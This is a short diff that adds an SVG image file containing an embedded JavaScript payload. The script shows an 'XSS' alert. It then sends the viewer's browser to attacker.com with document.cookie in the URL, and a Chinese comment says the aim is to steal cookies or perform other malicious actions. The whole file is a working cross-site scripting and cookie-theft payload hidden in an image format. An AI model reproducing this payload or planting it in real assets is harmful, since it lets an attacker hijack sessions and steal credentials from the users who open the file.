@@ -1,0 +1,7 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <script type="text/javascript">
+    alert('XSS');
+    // 尝试窃取Cookie或执行其他恶意操作
+    document.location='http://attacker.com/?cookie='+document.cookie;
+  </script>
+</svg>
